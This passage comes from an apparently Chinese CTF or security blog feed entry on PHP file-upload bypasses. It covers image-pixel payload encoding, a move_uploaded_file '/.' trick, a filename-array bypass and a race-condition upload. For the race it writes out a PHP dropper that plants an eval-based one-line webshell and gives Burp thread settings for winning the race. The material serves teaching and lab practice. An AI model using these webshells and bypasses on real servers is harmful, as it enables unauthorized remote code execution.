0x2d,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           0x66, 0x44, 0x50, 0x33);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$img = imagecreatetruecolor(32, 32);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for ($y = 0; $y &amp;lt; sizeof($p); $y += 3) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   $r = $p[$y];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   $g = $p[$y+1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   $b = $p[$y+2];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   $color = imagecolorallocate($img, $r, $g, $b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   imagesetpixel($img, round($y / 3), 0, $color);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;imagepng($img,&amp;#x27;./1.png&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202406231013995.png&#34; alt=&#34;image-20240623101353836&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;move_uploaded_file&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#move_uploaded_file&#34;&gt;#&lt;/a&gt; move_uploaded_file&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;move_uploaded_file()&lt;/code&gt;  这样一个函数，它有一个特性，会 &lt;code&gt;忽略&lt;/code&gt; 到文件末尾的 &lt;code&gt;/. &lt;/code&gt; 及后面的内容&lt;br&gt;
+并且 move_uploaded_file () 函数中的 img_path 是由 post 参数 save_name 控制的，这就可以在 save_name 的参数上面改动。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;C:%5CUsers%5C%E9%92%9F%E9%9B%A8%E4%B8%B9%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240512201442905.png&#34; alt=&#34;image-20240512201442905&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405122016196.png&#34; alt=&#34;image-20240512201613083&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;文件名数组绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件名数组绕过&#34;&gt;#&lt;/a&gt; 文件名数组绕过&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405122023329.png&#34; alt=&#34;image-20240512202306248&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;根据源代码，检查了文件类型必须是图片，并且把文件名 $file 打散成数组以 “.” 分割&lt;/li&gt;
+&lt;li&gt;这里也存在 move_uploaded_file 函数，也就是说也有忽略到文件末尾的 &lt;code&gt;/. &lt;/code&gt; 后面内容的性质。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;构造数组：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save_name[0]=“2.php/”&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save_name[1]为空&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save_name[2]=“jpg”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405122031785.png&#34; alt=&#34;image-20240512203122720&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405122031069.png&#34; alt=&#34;image-20240512203136009&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405122031801.png&#34; alt=&#34;image-20240512203157715&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;上传图片马后连接蚁剑的问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#上传图片马后连接蚁剑的问题&#34;&gt;#&lt;/a&gt; 上传图片马后连接蚁剑的问题&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;如果.htaccess 文件不起作用，导致蚁剑连接为空，可能是使用了 nts 版本的 php&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;文件上传之条件竞争&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传之条件竞争&#34;&gt;#&lt;/a&gt; 文件上传之条件竞争&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;竞争原理:&lt;br&gt;
+1. 网站允许上传任意文件，然后检测文件中若有 webshell，就删除文件；若不是指定类型文件，那么就使用 unlink 删除文件&lt;br&gt;
+ 2. 在删除之前访问上传的 php 文件，从而执行上传文件中的 php 代码&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;上传了一张图片和一句话木马，在文件路径发现只有图片&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121541157.png&#34; alt=&#34;屏幕截图 2023-08-10 192042&#34;&gt;&lt;/p&gt;
+&lt;p&gt;猜测是上传了 php 文件后被删除了，这里利用文件上传的条件竞争。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;文件上传后短时间内还没被服务器删除，这时抢在服务器删除之前访问它就能够写入一句话木马。&lt;/li&gt;
+&lt;li&gt;webshell:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fputs(fopen(&amp;quot;shell.php&amp;quot;, &amp;quot;w&amp;quot;), &amp;#x27;&amp;lt;?php @eval($_POST[&amp;quot;shell&amp;quot;]); ?&amp;gt;&amp;#x27;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这是上传的 php 文件，目的是一读取该文件就能创建并写入一句话木马。&lt;br&gt;
+注意：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;一句话木马与该文件不能重名&lt;/li&gt;
+&lt;li&gt;访问包的线程需要稍微大于上传包的线程。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;使用 bp 抓包：&lt;br&gt;
+上传 webshell 并抓包&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121540093.png&#34; alt=&#34;屏幕截图 2023-08-10 193559&#34;&gt;&lt;/p&gt;
+&lt;p&gt;访问文件路径并抓包&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121541455.png&#34; alt=&#34;屏幕截图 2023-08-10 193715&#34;&gt;&lt;/p&gt;
+&lt;p&gt;以上都设置为无 playload，无限期重复，前者线程数 30，后者线程数 50&lt;br&gt;
+ 当第二个访问包出现了 200 的状态吗说明成功了，这时访问上传文件的存储路径&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121541793.png&#34; alt=&#34;屏幕截图 2023-08-10 193941&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121541684.png&#34; alt=&#34;屏幕截图 2023-08-10 194009&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后蚁剑连接就行了。&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202405121539238.png&#34; alt=&#34;屏幕截图 2023-08-10 194108&#34;&gt;&lt;/p&gt;
+</content>
+        <updated>2024-06-15T16:00:00.000Z</updated>
+    </entry>
+</feed>
